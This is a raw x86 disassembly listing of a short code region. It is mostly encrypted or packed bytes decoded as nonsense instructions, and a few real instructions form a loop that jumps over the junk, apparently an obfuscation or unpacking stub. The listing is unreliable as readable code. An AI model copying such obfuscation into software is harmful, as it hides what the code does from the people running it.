  403a3b:	cmp    edx,eax
  403a3d:	jmp    0x403c0a
  403a42:	retf   
  403a43:	int3   
  403a44:	push   edi
  403a45:	push   0x6df17151
  403a4a:	mov    ch,0x57
  403a4c:	push   ebx
  403a4d:	mov    edi,0xa5ccaa7b
  403a52:	adc    dl,BYTE PTR [ecx]
  403a54:	jle    0x403ad4
  403a56:	scas   al,BYTE PTR es:[edi]
  403a57:	jg     0x403ad7
  403a59:	jle    0x403a10
  403a5b:	jg     0x403a04
  403a5d:	pop    ebx
  403a5e:	outs   dx,BYTE PTR ds:[esi]
  403a5f:	rol    esp,0xc0
  403a62:	jecxz  0x403a58
  403a64:	sbb    BYTE PTR [ebp+0x5e],ch
  403a67:	lods   eax,DWORD PTR ds:[esi]
  403a68:	stc    
  403a69:	sahf   
  403a6a:	jo     0x403aa9
  403a6c:	pop    ebp
  403a6d:	dec    ebp
  403a6e:	xchg   bh,bl
  403a70:	xchg   esi,eax
  403a71:	and    cl,BYTE PTR [ebx-0x43]
  403a74:	into   
  403a75:	xchg   ebx,eax
  403a76:	mov    al,ds:0xa8a18ce5
  403a7b:	out    0x78,al
  403a7d:	adc    al,0x62
  403a7f:	pop    esi
  403a80:	fist   DWORD PTR [edi+0x5d60be7d]
  403a86:	jns    0x403ab5
  403a88:	dec    ebx
  403a89:	and    DWORD PTR [esi+0x4052c82d],edi
  403a8f:	sbb    BYTE PTR [edi+0x54f4dcee],cl
  403a95:	mov    bl,0x74
  403a97:	fadd   st,st(1)
  403a99:	add    BYTE PTR [edi-0xf],0x16
  403a9d:	repnz test BYTE PTR [ecx+0x151ab52d],ch
  403aa4:	mov    ecx,0x6b140d7a
  403aa9:	outs   dx,DWORD PTR ds:[esi]
  403aaa:	test   DWORD PTR [eax],edi
  403aac:	xchg   ebx,eax
  403aad:	push   cs
  403aae:	or     BYTE PTR [edx-0x20],bl
  403ab1:	pop    ebx
  403ab2:	leave  
  403ab3:	test   BYTE PTR [eax],dh
  403ab5:	inc    edi
  403ab6:	stos   DWORD PTR es:[edi],eax
  403ab7:	mov    BYTE PTR [edi-0x31],dh
  403aba:	add    DWORD PTR [ebx+0x272d3572],esi
  403ac0:	in     al,dx
  403ac1:	icebp  
  403ac2:	aas    
  403ac3:	push   es
  403ac4:	mov    edx,DWORD PTR [ecx-0x1b94aab]
  403aca:	in     al,dx
  403acb:	ja     0x403a92
  403acd:	shl    DWORD PTR [esi],0xa
  403ad0:	cmp    eax,ebx
  403ad2:	xor    ebp,DWORD PTR [ecx]
  403ad4:	jno    0x403ab1
  403ad6:	test   DWORD PTR [ecx],ebp
  403ad8:	adc    eax,0x1813f141
  403add:	push   es
  403ade:	xor    al,0x66
  403ae0:	(bad)  
  403ae1:	or     BYTE PTR [ebx+0x2b],ch
  403ae4:	dec    ebp
  403ae5:	jmp    0x18be:0xfb038c9a
  403aec:	add    DWORD PTR [ebp-0x167160d4],ecx
  403af2:	adc    BYTE PTR [edi+eax*4+0x3f],dh
  403af6:	lock jmp 0x9645:0x4f9877e4
  403afe:	rcl    BYTE PTR [esi-0x16],0xfe
  403b02:	loope  0x403b6a
  403b04:	bound  esp,QWORD PTR [ebp+0x5c819e2e]
  403b0a:	xchg   ebx,eax
  403b0b:	dec    ecx
  403b0c:	sahf   
  403b0d:	add    ecx,DWORD PTR ds:0xc0c093d7
  403b13:	push   ecx
  403b14:	lea    esi,[ebp+0x7a]
  403b17:	fst    st(5)
  403b19:	pop    esi
  403b1a:	out    0x2e,eax
  403b1c:	out    0x5,al
  403b1e:	enter  0xf90e,0x2b
  403b22:	cmp    ah,al
  403b24:	lock xor eax,0x964d301a
  403b2a:	xchg   ah,dl
  403b2c:	inc    edx
  403b2d:	add    bl,BYTE PTR [edi-0x6e]
  403b30:	adc    esi,edx
  403b32:	rcr    dh,1
  403b34:	clc    
  403b35:	mov    esi,ecx
  403b37:	or     ch,BYTE PTR [esp+eiz*8]
  403b3a:	mov    WORD PTR [edx+0x7e],cs
  403b3d:	xor    al,0x2d
  403b3f:	push   ss
  403b40:	call   0x33d9:0x16947714
  403b47:	push   ss
  403b48:	adc    eax,0xbcd2393
  403b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b4e:	push   ebx
  403b4f:	pop    ds
  403b50:	xchg   BYTE PTR [ebx+eax*1],al
  403b53:	icebp  
  403b54:	pop    ss
  403b55:	(bad)  
  403b56:	leave  
  403b57:	push   0x59
  403b59:	pop    ss
  403b5a:	sbb    cl,al
  403b5c:	add    bl,bh
  403b5e:	popf   
  403b5f:	xor    al,0x5a
  403b61:	aaa    
  403b62:	and    ch,BYTE PTR [edx-0x3d]
  403b65:	leave  
  403b66:	or     ecx,ecx
  403b68:	scas   eax,DWORD PTR es:[edi]
  403b69:	(bad)  
  403b6c:	sub    eax,0x4cb8d6
  403b71:	jo     0x403be2
  403b73:	xor    BYTE PTR [edx],0xc1
  403b76:	push   0xffffffe4
  403b78:	test   BYTE PTR [ebx],al
  403b7a:	and    bh,BYTE PTR [edx+0x29]
  403b7d:	rcr    BYTE PTR [eax+0x75b12311],cl
  403b83:	jne    0x403b43
  403b85:	pop    ds
  403b86:	add    al,0x28
  403b88:	push   es
  403b89:	cmp    al,0x79
  403b8b:	dec    esp
  403b8c:	pop    ss
  403b8d:	f2xm1  
  403b8f:	inc    esp
  403b90:	or     DWORD PTR [esi],ecx
  403b92:	jmp    0x176b9cc1
  403b97:	pop    ds
  403b98:	push   edx
  403b99:	shr    ecx,cl
  403b9b:	xchg   ebx,eax
  403b9c:	inc    eax
  403b9d:	dec    ecx
  403b9e:	out    0x97,al
  403ba0:	lock or BYTE PTR [ebp-0x7905efd0],0x3e
  403ba8:	fs xchg ecx,eax
  403baa:	xor    dl,BYTE PTR [eax]
  403bac:	(bad)  
  403bae:	loopne 0x403ba8
  403bb0:	mov    BYTE PTR [eax-0x2cafec33],ah
  403bb6:	pop    edi
  403bb7:	jle    0x403bbf
  403bb9:	lock das 
  403bbb:	mov    DWORD PTR [edx-0x54],ebx
  403bbe:	mov    ebp,edx
  403bc0:	outs   dx,DWORD PTR ds:[esi]
  403bc1:	mov    ebx,0x1b548898
  403bc6:	jae    0x403b4e
  403bc8:	retf   
  403bc9:	nop
  403bca:	sti    
  403bcb:	push   ss
  403bcc:	add    BYTE PTR [ebx],cl
  403bce:	pushf  
  403bcf:	jle    0x403b97
  403bd1:	cdq    
  403bd2:	inc    esi
  403bd3:	push   0x5c
  403bd5:	xor    esi,0xffffffcb
  403bd8:	sbb    esi,esi
  403bda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bdb:	int3   
  403bdc:	sbb    BYTE PTR [edi],dh
  403bde:	js     0x403b8b
  403be0:	xchg   edi,eax
  403be1:	aad    0x59
  403be3:	lea    edx,[ecx-0x5ddb681]
  403be9:	jb     0x403bf5
  403beb:	inc    edi
  403bec:	xor    eax,DWORD PTR [edi+0x5efbbca4]
  403bf2:	fistp  DWORD PTR [edx+0x17d25cfd]
  403bf8:	mov    dl,0xc2
  403bfa:	xchg   esp,eax
  403bfb:	outs   dx,BYTE PTR ds:[esi]
  403bfc:	neg    ah
  403bfe:	rol    ah,1
  403c00:	mov    WORD PTR [eax-0x477739ae],cs
  403c06:	push   ecx
  403c07:	sar    BYTE PTR [ebx],1
  403c09:	cwde   
  403c0a:	je     0x4041a7
  403c10:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0x67dcf48b
  403c29:	les    ecx,FWORD PTR [eax]
  403c2b:	mov    BYTE PTR [edx+0x1e],al
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403c8e
  403c35:	mov    BYTE PTR [edx],dh
  403c37:	push   ebx
  403c38:	or     bl,BYTE PTR [edi]
  403c3a:	in     al,0x2c
  403c3c:	add    al,0xa4
  403c3e:	(bad)  
  403c40:	stos   BYTE PTR es:[edi],al
  403c41:	and    esp,ebx
  403c43:	(bad)  
  403c44:	lods   eax,DWORD PTR ds:[esi]
  403c45:	not    BYTE PTR [esi]
  403c47:	cmp    al,0x78
  403c49:	pop    ss
  403c4a:	xchg   esi,eax
  403c4b:	(bad)  
  403c4e:	shl    DWORD PTR [ecx+0x6d7ba72d],0xcd
  403c55:	(bad)  
  403c56:	in     al,dx
  403c57:	xchg   ebp,eax
  403c58:	cmc    
  403c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c5a:	xor    eax,0x12d72faf
  403c5f:	adc    ebp,esi
  403c61:	inc    eax
  403c62:	repnz add esi,esi
  403c65:	mov    ds:0xf853b73,al
  403c6a:	fisubr WORD PTR [ecx]
  403c6c:	data16 cli 
  403c6e:	xor    DWORD PTR [edi+0x0],eax
  403c71:	into   
  403c72:	cmp    eax,0x248f7e24
  403c77:	jmp    FWORD PTR [ecx-0x361e560f]
  403c7d:	add    dl,0xf7
  403c80:	inc    eax
  403c81:	inc    ebp
  403c82:	adc    ebx,DWORD PTR [ecx+edi*2-0x69]
  403c86:	lds    eax,FWORD PTR [esi]
  403c88:	in     eax,0x6a
  403c8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c8b:	ins    BYTE PTR es:[edi],dx
  403c8c:	(bad)  
  403c8d:	adc    DWORD PTR [ebp+0x3807c4d7],ebp
  403c93:	sti    
  403c94:	into   
  403c95:	out    0xb,al
  403c97:	test   DWORD PTR [eax+0x4cc3cfe7],ebp
  403c9d:	pop    ds
  403c9e:	sub    DWORD PTR [edi],esp
  403ca0:	cmp    bl,bh
  403ca2:	pop    DWORD PTR [edi+ebp*4+0x758009db]
  403ca9:	jo     0x403cb4
  403cab:	mov    dh,0x2a
  403cad:	ja     0x403d1f
  403caf:	push   ss
  403cb0:	in     al,0x29
  403cb2:	inc    esi
  403cb3:	idiv   DWORD PTR ds:[edi+eiz*1-0x6e]
  403cb8:	fucomip st,st(2)
  403cba:	rcl    DWORD PTR [ebx+0x4fed1890],0xc1
  403cc1:	and    BYTE PTR [esi],ah
  403cc3:	sub    ebx,edi
  403cc5:	scas   eax,DWORD PTR es:[edi]
  403cc6:	xchg   ebx,eax
  403cc7:	jno    0x403cc5
  403cc9:	mov    esi,0x422d73f6
  403cce:	lods   eax,DWORD PTR ds:[esi]
  403ccf:	cs or  eax,0x33ce4656
  403cd5:	int    0xe9
  403cd7:	cmp    BYTE PTR [eax],bh
  403cd9:	cmp    al,0x2d
  403cdb:	test   BYTE PTR [edi+edx*2],0x87
  403cdf:	sbb    edx,ecx
  403ce1:	out    dx,eax
  403ce2:	cmp    ch,ch
  403ce4:	push   eax
  403ce5:	daa    
  403ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ce7:	sub    al,0xf3
  403ce9:	retf   
  403cea:	data16 loopne 0x403d29
  403ced:	test   eax,0x151402e4
  403cf2:	jg     0x403d30
  403cf4:	shl    BYTE PTR [esi-0x2e],1
  403cf7:	add    al,0x8f
  403cf9:	arpl   WORD PTR [esp+eiz*2-0x73861803],di
  403d00:	pusha  
  403d01:	in     al,dx
  403d02:	mov    ah,0xb6
  403d04:	(bad)  [ebp-0x45]
  403d07:	nop
  403d08:	push   0xffffffd7
  403d0a:	add    ecx,DWORD PTR [edi+0x77]
  403d0d:	sbb    bh,0xaa
  403d10:	sub    BYTE PTR [ecx+0xf9f392c],ah
  403d16:	in     al,0xfc
  403d18:	outs   dx,DWORD PTR ds:[esi]
  403d19:	mov    dh,BYTE PTR [ebx+0x48]
  403d1c:	popf   
  403d1d:	aad    0x9c
  403d1f:	jl     0x403d5b
  403d21:	xchg   edx,eax
  403d22:	pop    esi
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d25:	sub    DWORD PTR [ebp-0xe0f794f],esi
  403d2b:	adc    DWORD PTR [eax-0x1b159c34],esp
  403d31:	jo     0x403cf5
  403d33:	cmp    DWORD PTR [ebp+0xf35fa55],eax
  403d39:	lahf   
  403d3a:	push   edi
  403d3b:	outs   dx,BYTE PTR ds:[esi]
  403d3c:	shl    esi,cl
  403d3e:	fxch   st(0)
  403d40:	mov    eax,0x1f97619f
  403d45:	ins    DWORD PTR es:[edi],dx
  403d46:	cmp    DWORD PTR [edx],esp
  403d48:	add    BYTE PTR [ebx],bh
  403d4a:	test   cl,al
  403d4c:	outs   dx,DWORD PTR ds:[esi]
  403d4d:	bound  eax,QWORD PTR [edx+ebx*4-0x68b5c646]
  403d54:	cmp    esp,0xffffffdf
  403d57:	add    al,0xdc
  403d59:	test   DWORD PTR [edx],ebx
  403d5b:	inc    ebp
  403d5c:	and    ecx,eax
  403d5e:	mov    al,0x67
  403d60:	ficomp DWORD PTR [edx-0x6c]
  403d63:	fist   WORD PTR [edx]
  403d65:	aad    0xd6
  403d67:	pop    esp
  403d68:	adc    eax,eax
  403d6a:	retfw  0xc87b
  403d6e:	mov    edx,0xdbe4732c
  403d73:	dec    ecx
  403d74:	les    ebx,FWORD PTR [edi]
  403d76:	mov    ecx,0x8fbc8abc
  403d7b:	push   esp
  403d7c:	jne    0x403d96
  403d7e:	shr    DWORD PTR [edi+0x4ee4dafd],0x9a
  403d85:	mov    ecx,0x79cffcfd
  403d8a:	ins    DWORD PTR es:[edi],dx
  403d8b:	push   ebx
  403d8c:	cli    
  403d8d:	dec    edx
  403d8e:	sahf   
  403d8f:	mov    esi,DWORD PTR [edx-0xd]
  403d92:	and    esi,DWORD PTR [ecx]
  403d94:	pop    DWORD PTR [edx+0x19]
  403d97:	lods   eax,DWORD PTR ds:[esi]
  403d98:	test   BYTE PTR [edi+0x392ab683],bh
  403d9e:	push   ebx
  403d9f:	shl    DWORD PTR [ebp+0xe],cl
  403da2:	hlt    
  403da3:	pop    ebx
  403da4:	fwait
  403da5:	iret   
  403da6:	in     al,dx
  403da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da8:	icebp  
  403da9:	push   es
  403daa:	call   0xa502:0xa46c0a17
  403db1:	jmp    0xea74:0x9abc2f3d
  403db8:	add    ebx,esp
  403dba:	lods   eax,DWORD PTR ds:[esi]
  403dbb:	push   es
  403dbc:	sub    eax,DWORD PTR ss:[ebx]
  403dbf:	adc    bl,dh
  403dc1:	imul   ebx,DWORD PTR [ebp-0x39],0x5d
  403dc5:	push   edx
  403dc6:	retf   
  403dc7:	sbb    DWORD PTR [eax-0x70d69031],0x78bd0bfe
  403dd1:	mov    ebp,edx
  403dd3:	clc    
  403dd4:	sub    dl,dl
  403dd6:	dec    edx
  403dd7:	fwait
  403dd8:	xor    al,0x7a
  403dda:	inc    eax
  403ddb:	fimul  DWORD PTR [eax-0x62]
  403dde:	arpl   di,bx
  403de0:	jge    0x403ded
  403de2:	and    ecx,ebx
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi-0xc90d299],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e22
  403e11:	mov    eax,ds:0xdc84966
  403e16:	add    al,0xdf
  403e18:	mov    dl,0xf8
  403e1a:	test   DWORD PTR ds:0x195d0cf1,edi
  403e20:	jmp    0xfe784057
  403e25:	fs push ecx
  403e27:	gs retf 0x1a81
  403e2b:	(bad)  
  403e2c:	out    0x6e,al
  403e2e:	shl    DWORD PTR [edi+0x11d2bf28],1
  403e34:	sti    
  403e35:	imul   ebx,DWORD PTR [edi+0x5e],0x83d76551
  403e3c:	cdq    
  403e3d:	loopne 0x403e1a
  403e3f:	repz int 0xa8
  403e42:	mov    al,ds:0x600c71bf
  403e47:	inc    esi
  403e48:	mov    al,ch
  403e4a:	pop    ecx
  403e4b:	rdpmc  
  403e4d:	fsubr  QWORD PTR [eax+0x79]
  403e50:	in     al,0x67
  403e52:	mov    ch,0x92
  403e54:	xor    BYTE PTR [ebp+0x77685ea5],ah
  403e5a:	jns    0x403e3c
  403e5c:	shr    ah,cl
  403e5e:	jns    0x403e8a
  403e60:	mov    dh,0x22
  403e62:	(bad)  
  403e63:	hlt    
  403e64:	mov    dl,0xc2
  403e66:	pop    ds
  403e67:	mov    ah,0xe2
  403e69:	adc    esi,ecx
  403e6b:	fcomip st,st(2)
  403e6d:	cmp    DWORD PTR [edi+0xc8c8a92],eax
  403e73:	xor    DWORD PTR [eax],0xdb781f34
  403e79:	enter  0x4ba2,0x7e
  403e7d:	icebp  
  403e7e:	pop    ebx
  403e7f:	inc    esi
  403e80:	dec    ebp
  403e81:	lahf   
  403e82:	(bad)  
  403e83:	xor    eax,0x9735004b
  403e88:	(bad)  [edx]
  403e8a:	mov    dl,0x5d
  403e8c:	loopne 0x403eda
  403e8e:	cli    
  403e8f:	fdivr  st(2),st
  403e91:	scas   eax,DWORD PTR es:[edi]
  403e92:	push   ebx
  403e93:	loop   0x403e3d
  403e95:	push   esp
  403e96:	push   edx
  403e97:	mov    bl,0x4
  403e99:	jmp    0xeb994871
  403e9e:	push   0xffffffcd
  403ea0:	loope  0x403ee0
  403ea2:	js     0x403e2b
  403ea4:	xlat   BYTE PTR ds:[ebx]
  403ea5:	das    
  403ea6:	clc    
  403ea7:	mov    BYTE PTR [ecx],ah
  403ea9:	adc    BYTE PTR [esi],0x1
  403eac:	mov    al,0x2d
  403eae:	cdq    
  403eaf:	scas   eax,DWORD PTR es:[edi]
  403eb0:	jo     0x403e97
  403eb2:	aam    0xd7
  403eb4:	fistp  DWORD PTR es:[eax]
  403eb7:	pushf  
  403eb8:	jb     0x403e61
  403eba:	dec    ebp
  403ebb:	pop    edi
  403ebc:	sbb    DWORD PTR [ebx+0x7c558c16],eax
  403ec2:	in     al,0x8f
  403ec4:	aam    0x2d
  403ec6:	xor    bl,bh
  403ec8:	sub    eax,0xb35fd402
  403ecd:	imul   edx,DWORD PTR [edx],0x8b4040b8
  403ed3:	adc    DWORD PTR [edx+eiz*2],esi
  403ed6:	mov    cl,0x9a
  403ed8:	outs   dx,DWORD PTR ds:[esi]
  403ed9:	jl     0x403ec2
  403edb:	mov    bl,0x23
  403edd:	jecxz  0x403f5a
  403edf:	adc    BYTE PTR [edi+eiz*8],ch
  403ee2:	es icebp 
  403ee4:	scas   al,BYTE PTR es:[edi]
  403ee5:	mov    bh,0xea
  403ee7:	rcl    BYTE PTR [esi],0x59
  403eea:	push   ds
  403eeb:	mov    edx,0x3aab1341
  403ef0:	pusha  
  403ef1:	das    
  403ef2:	cmp    dl,BYTE PTR ds:0xdf42adb0
  403ef8:	mov    edx,0xbfbcd704
  403efd:	cld    
  403efe:	jno    0x403e83
  403f00:	dec    edx
  403f01:	imul   edi,DWORD PTR [edi-0x7d],0xe58064e1
  403f08:	jmp    0x403f54
  403f0a:	int    0x4b
  403f0c:	dec    eax
  403f0d:	shl    ebp,cl
  403f0f:	jae    0x403f6b
  403f11:	dec    esi
  403f12:	mov    bh,0xb7
  403f14:	pop    edx
  403f15:	call   0xe2fe:0x3e99e8c7
  403f1c:	imul   eax,DWORD PTR [edx+0x70],0x71
  403f20:	es inc edi
  403f22:	xchg   ebp,eax
  403f23:	cli    
  403f24:	lods   eax,DWORD PTR ds:[esi]
  403f25:	xchg   esi,eax
  403f26:	les    esi,FWORD PTR [ecx]
  403f28:	push   0xffffffab
  403f2a:	test   BYTE PTR [edx+0x1ec75784],0xff
  403f31:	xor    eax,0x38eedff6
  403f36:	out    0x92,eax
  403f38:	cmc    
  403f39:	fs dec edx
  403f3b:	ds cld 
  403f3d:	arpl   WORD PTR [esi],si
  403f3f:	xchg   esp,eax
  403f40:	aas    
  403f41:	mov    ebx,0xd4b99e17
  403f46:	and    ch,BYTE PTR [ebp-0x1c1bf5b9]
  403f4c:	shufps xmm7,XMMWORD PTR [ecx],0x5e
  403f50:	sbb    bl,bl
  403f52:	pushf  
  403f53:	mov    ecx,0xca4e94d5
  403f58:	mov    bl,0x93
  403f5a:	mov    esi,0x87e22d6a
  403f5f:	(bad)  
  403f60:	imul   ecx,DWORD PTR [eax+edx*8+0x78],0xc5aa0bf6
  403f68:	ror    DWORD PTR [edx],0xb1
  403f6b:	push   ebp
  403f6c:	leave  
  403f6d:	iret   
  403f6e:	shl    DWORD PTR [ecx-0x5c92481d],0x70
  403f75:	xor    cl,BYTE PTR [eax-0x61efab67]
  403f7b:	mov    bh,0xba
  403f7d:	add    DWORD PTR [ecx+edi*8],esp
  403f80:	retf   
  403f81:	adc    eax,DWORD PTR [eax-0xb]
  403f84:	fcomp  QWORD PTR [ebx+0x9]
  403f87:	test   BYTE PTR [eax+0x5e],bh
  403f8a:	push   0xffffffc2
  403f8c:	cs pop edi
  403f8e:	lods   al,BYTE PTR ds:[esi]
  403f8f:	(bad)  
  403f90:	or     DWORD PTR [esp+esi*4+0x6d],ebx
  403f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f95:	inc    ecx
  403f96:	ins    DWORD PTR es:[edi],dx
  403f97:	test   BYTE PTR [eax],ah
  403f99:	mov    BYTE PTR [esi-0x1d9236bb],0xd0
  403fa0:	ins    DWORD PTR es:[edi],dx
  403fa1:	or     al,0x5f
  403fa3:	arpl   bp,dx
  403fa5:	dec    ebx
  403fa6:	test   BYTE PTR [edx+0x5f],0xc5
  403faa:	sub    eax,0x49b420c5
  403faf:	rcl    DWORD PTR [eax-0x76],cl
  403fb2:	or     edx,DWORD PTR [eax+0x77f0e98e]
  403fb8:	pop    eax
  403fb9:	dec    edi
  403fba:	xchg   ecx,eax
  403fbb:	retf   
  403fbc:	stos   DWORD PTR es:[edi],eax
  403fbd:	xchg   ebp,eax
  403fbe:	sbb    eax,0xf0458ba6
  403fc3:	mov    edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	mov    dl,0xdb
  403fdb:	jne    0x40403c
  403fdd:	and    bl,BYTE PTR [edx]
  403fdf:	jle    0x40405f
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403fc5
  403fe6:	scas   al,BYTE PTR es:[edi]
  403fe7:	mov    ds:0x91525611,al
  403fec:	popf   
  403fed:	mov    eax,ds:0xcb4e760a
  403ff2:	adc    BYTE PTR [esi-0x71],bh
  403ff5:	mov    dl,0x58
  403ff7:	push   esp
  403ff8:	xchg   esi,eax
  403ff9:	call   0x18a9097d
  403ffe:	mov    ds:0xa20f3611,al
  404003:	das    
  404004:	aaa    
  404005:	sti    
  404006:	jmp    0x404061
  404008:	pop    esi
  404009:	mov    edx,ebp
  40400b:	or     ecx,edi
  40400d:	cmp    eax,0x7f2d055c
  404012:	retf   
  404013:	lahf   
  404014:	out    dx,al
  404015:	sbb    DWORD PTR [edx],0x6a
  404018:	lods   al,BYTE PTR ds:[esi]
  404019:	lock dec ecx
  40401b:	shr    BYTE PTR [edx+ecx*1-0x2a],cl
  40401f:	cld    
  404020:	cmc    
  404021:	fild   WORD PTR [esi+0x5108450]
  404027:	loopne 0x404039
  404029:	ins    DWORD PTR es:[edi],dx
  40402a:	cmp    BYTE PTR [eax+0x1001376f],al
  404030:	adc    al,0x4c
  404032:	(bad)  
  404033:	jp     0x403fbb
  404035:	ins    DWORD PTR es:[di],dx
  404037:	inc    esp
  404038:	loop   0x40401f
  40403a:	push   ebx
  40403b:	push   ebx
  40403c:	ds jne 0x40406c
  40403f:	frstor [ebx]
  404041:	push   ss
  404042:	aas    
  404043:	mov    ebx,0x9f72cdff
  404048:	in     al,0xc
  40404a:	push   esi
  40404b:	jne    0x404017
  40404d:	das    
  40404e:	shl    dh,1
  404050:	lock inc eax
  404052:	mov    dh,0x28
  404054:	cmp    al,0xf3
  404056:	pop    esi
  404057:	mov    dh,0x11
  404059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40405a:	popf   
  40405b:	iret   
  40405c:	stc    
  40405d:	into   
  40405e:	out    0xdd,al
  404060:	retf   0xceef
  404063:	leave  
  404064:	repnz cli 
  404066:	cwde   
  404067:	mov    ch,0xe
  404069:	out    0x8e,eax
  40406b:	rcr    BYTE PTR [ecx+0x69f27261],0x3c
  404072:	push   0x6b
  404074:	rcr    ch,cl
  404076:	jno    0x4040ba
  404078:	xchg   edi,eax
  404079:	xadd   ebx,esi
  40407c:	outs   dx,DWORD PTR ds:[esi]
  40407d:	std    
  40407e:	ret    0x67c7
  404081:	add    al,0x14
  404084:	add    al,0x8e
  404086:	mov    DWORD PTR [esi-0x1b],ebp
  404089:	inc    edi
  40408a:	pop    ecx
  40408b:	cdq    
  40408c:	jge    0x404014
  40408e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40408f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404090:	fldcw  WORD PTR [ecx+0xe5a4152]
  404096:	ins    BYTE PTR es:[edi],dx
  404097:	or     DWORD PTR [edx+0x5de6c5e6],ebx
  40409d:	sbb    eax,esi
  40409f:	lock iret 
  4040a1:	shr    DWORD PTR [ebx+0x6b],cl
  4040a4:	mov    gs,esp
  4040a6:	push   0x4f
  4040a8:	loop   0x404030
  4040aa:	sbb    DWORD PTR [ebx],ecx
  4040ac:	mov    bh,0x25
  4040ae:	sub    eax,0x14f21563
  4040b3:	clc    
  4040b4:	rol    DWORD PTR [edx+esi*1-0x4d4d1b84],1
  4040bb:	ins    DWORD PTR es:[edi],dx
  4040bc:	sbb    edi,DWORD PTR [eax-0x22]
  4040bf:	arpl   WORD PTR [edi+0x3f771240],cx
  4040c5:	sbb    bh,BYTE PTR [ebx+0x636e5e13]
  4040cb:	ret    0x3a02
  4040ce:	aaa    
  4040cf:	or     cl,BYTE PTR [edi+esi*8]
  4040d2:	sbb    cl,bh
  4040d4:	dec    eax
  4040d5:	adc    dh,bh
  4040d7:	cmp    BYTE PTR [edi-0x40],bl
  4040da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040db:	xor    ah,BYTE PTR [ecx-0x3e]
  4040de:	or     esi,edx
  4040e0:	sbb    DWORD PTR [ebp-0x70],ebp
  4040e3:	lods   al,BYTE PTR ds:[esi]
  4040e4:	gs mov ebx,0x749b8315
  4040ea:	lods   al,BYTE PTR ds:[esi]
  4040eb:	sub    BYTE PTR [ecx+0x4f],0xdb
  4040ef:	test   BYTE PTR [edx],0x72
  4040f2:	(bad)  [esi+0x70]
  4040f5:	into   
  4040f6:	mov    ebp,0xe25af032
  4040fb:	jle    0x404169
  4040fd:	stc    
  4040fe:	lock dec eax
  404100:	fwait
  404101:	xchg   ebx,eax
  404102:	test   al,0xaa
  404104:	sbb    al,dl
  404106:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404107:	pop    eax
  404108:	pushf  
  404109:	cli    
  40410a:	inc    edx
  40410b:	push   0xf85ccff3
  404110:	cld    
  404111:	jbe    0x4040d9
  404113:	jmp    0x316f9662
  404118:	mov    al,ds:0xa35fc7c1
  40411d:	mov    eax,0x2d1b662
  404122:	push   edi
  404123:	ins    DWORD PTR es:[edi],dx
  404124:	cmp    DWORD PTR [esi+0x1fc9a8e7],esi
  40412a:	ds adc al,al
  40412d:	push   es
  40412e:	aad    0xd0
  404130:	shl    BYTE PTR [ebp+0x49],1
  404133:	jno    0x404129
  404135:	in     al,0xe9
  404137:	cmp    DWORD PTR [edi+0x9],ebp
  40413a:	in     eax,dx
  40413b:	or     DWORD PTR [esi],esp
  40413d:	aam    0x19
  40413f:	cmc    
  404140:	push   eax
  404141:	test   eax,0x8c7b6df6
  404146:	sbb    eax,0x1e9b82bf
  40414b:	jno    0x404176
  40414d:	scas   eax,DWORD PTR es:[edi]
  40414e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40414f:	mov    al,0xcf
  404151:	stos   BYTE PTR es:[edi],al
  404152:	jl     0x404110
  404154:	mov    al,0x6e
  404156:	call   0x938e:0xe2b748dc
  40415d:	pop    esi
  40415e:	xor    al,0x67
  404160:	sub    BYTE PTR [ebp-0x1c5d32fb],al
  404166:	iret   
  404167:	mov    al,ds:0x974c262c
  40416c:	add    BYTE PTR [edx-0x23b1f00c],cl
  404172:	push   cs
  404173:	jle    0x404197
  404175:	clc    
  404176:	outs   dx,DWORD PTR ds:[esi]
  404177:	ins    DWORD PTR es:[edi],dx
  404178:	sub    al,0xd9
  40417a:	in     eax,dx
  40417b:	fwait
  40417c:	or     dl,BYTE PTR [ecx-0x52cad60b]
  404182:	mov    ebx,0x18e69d2a
  404187:	call   0xdaa240ea
  40418c:	pushf  
  40418d:	mov    al,0x86
  40418f:	adc    BYTE PTR [ebp+0x23],bh
  404192:	jle    0x4041d5
  404194:	clc    
  404195:	lea    eax,[eax+edx*1+0x32729b]
  40419c:	mov    DWORD PTR [ebp+0x8],eax
  40419f:	inc    DWORD PTR [ebp+0xc]
  4041a2:	jmp    0x403a0a
  4041a7:	mov    eax,DWORD PTR [ebp-0x10]
